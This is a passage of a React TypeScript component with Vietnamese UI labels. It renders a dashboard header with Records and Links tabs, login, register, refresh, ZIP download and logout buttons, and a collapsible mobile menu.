  isAuthed,
  username,
  tab,
  setTab,
  onRefresh,
  onDownload,
  onLogout,
  onOpenLogin,
  onOpenRegister,
}: {
  accent: string;
  isAuthed: boolean;
  username: string;
  tab: "records" | "links";
  setTab: (t: "records" | "links") => void;
  onRefresh: () => void;
  onDownload: () => void;
  onLogout: () => void;
  onOpenLogin: () => void;
  onOpenRegister: () => void;
}) {
  const [open, setOpen] = React.useState(false);

  // đóng menu khi đổi tab / resize
  React.useEffect(() => {
    const onResize = () => setOpen(false);
    window.addEventListener("resize", onResize);
    return () => window.removeEventListener("resize", onResize);
  }, []);

  return (
    <div className="sticky top-0 z-50 backdrop-blur-xl bg-[#0e1218]/60 border-b border-white/10">
      <div className="mx-auto w-full max-w-7xl px-4 sm:px-6 lg:px-8 py-3">
        {/* row 1 */}
        <div className="flex items-center justify-between">
          <div>
            <h1
              className="text-2xl font-semibold tracking-tight"
              style={{ color: accent }}
            >
              Dashboard
            </h1>
            <p className="text-dim text-xs">Liquid Glass · Mono Color</p>
          </div>

          {/* desktop actions */}
          <div className="hidden sm:flex gap-2 items-center">
            {isAuthed ? (
              <>
                <div className="glass px-3 py-2 rounded-xl text-sm text-muted flex items-center gap-2">
                  <ShieldCheck size={16} className="icon-dim" />
                  <span className="font-medium">{username}</span>
                </div>
                <button
                  onClick={onRefresh}
                  className="glass btn-outline px-3 py-2 rounded-xl flex items-center gap-2"
                  title="Làm mới dữ liệu"
                >
                  <RefreshCcw size={16} className="icon-dim" />
                  <span className="text-muted">Làm mới</span>
                </button>
                <button
                  onClick={onDownload}
                  className="btn-solid px-4 py-2 rounded-xl"
                  title="Tải bản ZIP theo username"
                >
                  <span className="inline-flex items-center gap-2 font-semibold">
                    <Download size={16} /> Tải bản mới
                  </span>
                </button>
                <button
                  onClick={onLogout}
                  className="glass btn-outline px-3 py-2 rounded-xl flex items-center gap-2"
                  title="Đăng xuất"
                >
                  <LogOut size={16} className="icon-dim" />
                  <span className="text-muted">Đăng xuất</span>
                </button>
              </>
            ) : (
              <>
                <button
                  onClick={onOpenLogin}
                  className="glass btn-outline px-3 py-2 rounded-xl flex items-center gap-2"
                  title="Đăng nhập"
                >
                  <LogIn size={16} className="icon-dim" />
                  <span className="text-muted">Đăng nhập</span>
                </button>
                <button
                  onClick={onOpenRegister}
                  className="btn-solid px-4 py-2 rounded-xl"
                  title="Đăng ký"
                >
                  <span className="inline-flex items-center gap-2 font-semibold">
                    <UserPlus size={16} /> Đăng ký
                  </span>
                </button>
              </>
            )}
          </div>

          {/* mobile toggle */}
          <button
            className="sm:hidden inline-flex items-center justify-center w-10 h-10 rounded-xl border border-white/15"
            aria-expanded={open}
            aria-label="Toggle menu"
            onClick={() => setOpen((v) => !v)}
          >
            {open ? <EyeOff size={18} /> : <Eye size={18} />}
          </button>
        </div>

        {/* row 2: Tabs + quick actions — mobile panel collapsible */}
        <div className="mt-3">
          {/* Tabs (luôn hiển thị trên desktop) */}
          <div className="hidden sm:flex items-center gap-2">
            <button
              className={`tab-btn ${tab === "records" ? "active" : ""}`}
              onClick={() => setTab("records")}
            >
              Records
            </button>
            <button
              className={`tab-btn ${tab === "links" ? "active" : ""}`}
              onClick={() => setTab("links")}
            >
              Links
            </button>
          </div>

          {/* Mobile collapsible */}
          {open && (
            <div className="sm:hidden mt-3 space-y-3">
              <div className="flex items-center gap-2">
                <button
                  className={`tab-btn flex-1 ${
                    tab === "records" ? "active" : ""
                  }`}
                  onClick={() => {
                    setTab("records");
                    setOpen(false);
                  }}
                >
                  Records
                </button>
                <button
                  className={`tab-btn flex-1 ${
                    tab === "links" ? "active" : ""
                  }`}
                  onClick={() => {
                    setTab("links");
                    setOpen(false);
                  }}
                >
                  Links
                </button>
              </div>

              {/* actions rút gọn cho mobile */}
              <div className="grid grid-cols-2 gap-2">
                {isAuthed ? (
                  <>
                    <button
                      onClick={onRefresh}
                      className="glass btn-outline px-3 py-2 rounded-xl flex items-center justify-center gap-2"
                    >
                      <RefreshCcw size={16} />
                      Làm mới
                    </button>
                    <button
                      onClick={onDownload}
                      className="btn-solid px-3 py-2 rounded-xl"
                    >
                      Tải ZIP
                    </button>
                    <button
                      onClick={onLogout}
                      className="col-span-2 glass btn-outline px-3 py-2 rounded-xl"
                    >
                      Đăng xuất
                    </button>
                  </>
                ) : (
                  <>
                    <button
                      onClick={onOpenLogin}
                      className="glass btn-outline px-3 py-2 rounded-xl"
                    >
                      Đăng nhập
                    </button>
                    <button
                      onClick={onOpenRegister}
                      className="btn-solid px-3 py-2 rounded-xl"
                    >
                      Đăng ký
                    </button>
                  </>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
